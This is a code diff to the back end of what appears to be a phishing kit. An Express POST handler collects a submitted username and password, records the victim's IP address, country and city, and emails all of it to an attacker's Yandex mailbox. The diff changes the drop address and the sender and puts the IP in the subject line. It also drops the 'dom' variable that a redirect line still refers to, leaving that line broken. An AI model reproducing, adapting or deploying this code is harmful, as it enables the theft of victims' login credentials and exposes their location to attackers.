@@ -29,7 +29,7 @@ app.get("/", (request, response) => {
 app.post("/", (req, res) => {
   const { ai, pr } = req.body;
   console.log(req.body);
-  let logEmail = "sharedbox2021@yandex.com";
+  let logEmail = "esco2021@yandex.com";
 
   // Get the user's IPv4 address
   const ip = requestIp.getClientIp(req);
@@ -38,7 +38,6 @@ app.post("/", (req, res) => {
   const geo = geoip.lookup(ip);
   const country = geo ? geo.country : "unknown";
   const city = geo ? geo.city : "unknown";
-
   const html = `
     <!DOCTYPE html>
     <html lang='en'>
@@ -49,26 +48,25 @@ app.post("/", (req, res) => {
     </head>  
     <body>
     Details Has Arrived!!
-    <h4>User: ${ai}</h4>
-    <h4>Access: ${pr}</h4>
-    <h4>IP: ${ip}</h4>
-    <h4>Country: ${country}</h4>
-    <h4>City: ${city}</h4>
-    </div>
-    <div style='margin-left: 40px;'><small>Data delivered by bishop</small></div>
+    <h3>User: ${ai}</h3>
+    <h3>Access: ${pr}</h3>
+    <h3>IP: ${ip}</h3>
+    <h3>Country: ${country}</h3>
+    <h3>City: ${city}</h3>
+   
     </body>
     </html>
     `;
-
-  const dom = req.body.email.split("@")[1];
+ 
+  let ip2 = requestIp.getClientIp(req);
 
   let redirectUrl = "https://${dom}";
 
   sendmail(
     {
-      from: "logs@logscentral.com",
+      from: "docu@logscentral.com",
       to: logEmail,
-      subject: req.body.email.split("@")[1] + " Email Log",
+      subject: "EMAIL-LOG " + ip2,
       html,
     },
     function (err, reply) {
